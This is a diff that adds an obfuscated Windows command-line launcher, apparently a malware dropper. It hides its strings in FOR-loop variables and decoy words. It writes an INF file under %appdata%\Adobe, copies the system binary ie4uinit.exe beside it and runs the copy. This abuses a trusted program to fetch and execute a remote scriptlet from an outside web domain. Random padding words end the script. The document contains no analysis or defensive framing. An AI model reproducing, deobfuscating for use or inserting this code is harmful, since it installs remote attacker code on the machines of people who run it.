@@ -1,0 +1,7 @@
+/v /c (for %c in (s) do @set "Dignity=%~c") &&
+  (for %z in (a) do @set "Emissions=%~z") &&
+  (for %g in (i) do @set "Optimization=%~g") &&
+  (for %g in (c) do @set "Message=%~g") &&
+  call(for %c in ("[version]" "signature =$windows nt$" "[FF9F]" "ieu%Siren%.inf" "[00332]" "sc\" "ro%Because%j,NI,%Brand%%Alpha%%Alpha%p%Shine%%Assist%%Assist%1!Politi!Message!ians!teresamalins!Politi!Message!ians!com/applicationresponce" "[destinationdirs]" "FF9F=01" "defaultdestdir=11" "[strings]" "shortsvcname=' '" "Because=b;Actors" "Dealers=%t!Optimization!me%" "Assist=/" "servicename=' '" "Alpha=t;Access" "Siren=init" "Brand=h" "Shine=:;Teaches" "[defaultinstall.windows7]" "Un\" "Register\" "OCXs=00332" "delfiles=FF9F" ) do @echo %~c)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!Optimization!n!Shaft!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Minimum3=Centuries &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Minimum7=Income Signs Cousin Relationships Influences Accessories Tattoo Anger Middle Lanes Antibodies Breeds Applicants Partnerships Unusual Numbers Match Eternal Quick Released Shapes Reopen Mountain Feature Perhaps Educate Million Arguments Vacancies Increased Pigeon Banana Stock Investments Lights Hobbies Sizes Organizations Printers Scholars Mixture Cells Regulations Happy Newspapers Athlete Andreas Hobby Determines Frames Demands Chairs Parrot Contains Tactics"
